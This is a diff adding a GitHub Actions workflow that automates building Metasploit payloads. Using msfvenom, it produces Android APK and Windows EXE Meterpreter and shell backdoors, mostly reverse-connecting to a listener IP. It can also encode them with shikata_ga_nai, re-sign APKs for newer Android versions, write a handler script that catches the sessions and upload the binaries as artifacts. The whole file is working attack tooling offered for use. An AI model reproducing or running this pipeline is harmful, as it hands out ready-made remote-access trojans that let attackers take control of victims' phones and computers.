@@ -1,0 +1,162 @@
+name: Build Payload
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload:
+        description: "Payload to generate"
+        required: true
+        default: android/meterpreter/reverse_tcp
+        type: choice
+        options:
+          - android/meterpreter/reverse_tcp
+          - android/meterpreter/reverse_https
+          - android/meterpreter/bind_tcp
+          - windows/meterpreter/reverse_tcp
+          - windows/x64/meterpreter/reverse_tcp
+          - windows/shell/reverse_tcp
+          - windows/x64/shell_reverse_tcp
+      lhost:
+        description: "LHOST (your listener IP)"
+        required: true
+        default: "203.0.113.10"
+      lport:
+        description: "LPORT (listener port / bind port)"
+        required: true
+        default: "4444"
+      encoder:
+        description: "Encoder (windows x86 only, leave empty for none)"
+        required: false
+        default: ""
+        type: choice
+        options:
+          - ""
+          - x86/shikata_ga_nai
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      PAYLOAD: ${{ inputs.payload || 'android/meterpreter/reverse_tcp' }}
+      LHOST: ${{ inputs.lhost || '203.0.113.10' }}
+      LPORT: ${{ inputs.lport || '4444' }}
+      ENCODER: ${{ inputs.encoder || '' }}
+
+    steps:
+      - name: Install Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - name: Install Metasploit Framework
+        run: |
+          curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
+          chmod 755 msfinstall
+          sudo ./msfinstall
+          echo "/opt/metasploit-framework/bin" >> "$GITHUB_PATH"
+
+      - name: Verify Metasploit
+        run: |
+          msfconsole --version
+          msfvenom -l payloads | grep -F "$PAYLOAD" || { echo "payload not found: $PAYLOAD"; exit 1; }
+
+      - name: Build payload
+        run: |
+          set -euo pipefail
+          mkdir -p out
+
+          case "$PAYLOAD" in
+            android/*)       EXT=apk; FMT=raw ;;
+            windows/x64/*)   EXT=exe; FMT=exe ;;
+            windows/*)       EXT=exe; FMT=exe ;;
+            *)               echo "unsupported payload: $PAYLOAD"; exit 1 ;;
+          esac
+
+          NAME=$(echo "$PAYLOAD" | tr '/' '_')
+          SAFE_NAME=$(echo "$PAYLOAD" | tr '/' '-' | tr -d ' :"<>|*?\')
+          echo "SAFE_NAME=$SAFE_NAME" >> "$GITHUB_ENV"
+          OUT="out/${NAME}.${EXT}"
+
+          ARGS=(-p "$PAYLOAD")
+          case "$PAYLOAD" in
+            *bind*) : ;;                          # bind payload: no LHOST
+            *)      ARGS+=(LHOST="$LHOST") ;;
+          esac
+          ARGS+=(LPORT="$LPORT")
+
+          if [ -n "${ENCODER:-}" ]; then
+            if [ "$EXT" = "exe" ] && [ "$PAYLOAD" != windows/x64/* ]; then
+              ARGS+=(-e "$ENCODER" -i 5)
+            else
+              echo "encoder ignored for $PAYLOAD"
+            fi
+          fi
+
+          echo "msfvenom ${ARGS[*]} -f $FMT -o $OUT"
+          msfvenom "${ARGS[@]}" -f "$FMT" -o "$OUT"
+
+          [ -s "$OUT" ] || { echo "empty output"; exit 1; }
+          file "$OUT"
+          ls -lh "$OUT"
+
+      - name: Re-sign APK (Android 11+ compatibility)
+        continue-on-error: true
+        if: endsWith(env.PAYLOAD, 'tcp') || endsWith(env.PAYLOAD, 'https')
+        run: |
+          set -euo pipefail
+          [ -n "$(ls -A out/*.apk 2>/dev/null)" ] || exit 0
+          sudo apt-get update -qq && sudo apt-get install -y apksigner || exit 0
+          keytool -genkeypair -keystore lab.jks -alias lab -keyalg RSA -keysize 2048 \
+            -validity 10000 -storepass labpass -keypass labpass \
+            -dname "CN=lab, OU=lab, O=lab, C=US" 2>/dev/null
+          for f in out/*.apk; do
+            case "$f" in *-signed.apk) continue ;; esac
+            apksigner sign --ks lab.jks --ks-pass pass:labpass --key-pass pass:labpass \
+              --v1-signing-enabled true --v2-signing-enabled true \
+              --out "${f%.apk}-signed.apk" "$f"
+            apksigner verify "${f%.apk}-signed.apk" || true
+          done
+          ls -lh out
+
+      - name: Write handler.rc
+        run: |
+          set -euo pipefail
+          {
+            echo "# msfconsole -r handler.rc"
+            echo "use exploit/multi/handler"
+            echo "set payload $PAYLOAD"
+            echo "set LHOST $LHOST"
+            echo "set LPORT $LPORT"
+            echo "set ExitOnSession false"
+            echo "run -j"
+          } > out/handler.rc
+          cat out/handler.rc
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ env.SAFE_NAME }}-${{ github.run_number }}
+          path: out/
+          if-no-files-found: error
+          retention-days: 7
+
+      - name: Summary
+        run: |
+          {
+            echo "### Payload built"
+            echo ""
+            echo "- payload: \`$PAYLOAD\`"
+            echo "- LHOST/LPORT: \`$LHOST:$LPORT\`"
+            echo "- encoder: \`${ENCODER:-none}\`"
+            echo ""
+            echo "| file | size |"
+            echo "|---|---|"
+            for f in out/*; do [ -e "$f" ] && echo "| \`$(basename "$f")\` | $(du -h "$f" | cut -f1) |"; done
+          } >> "$GITHUB_STEP_SUMMARY"
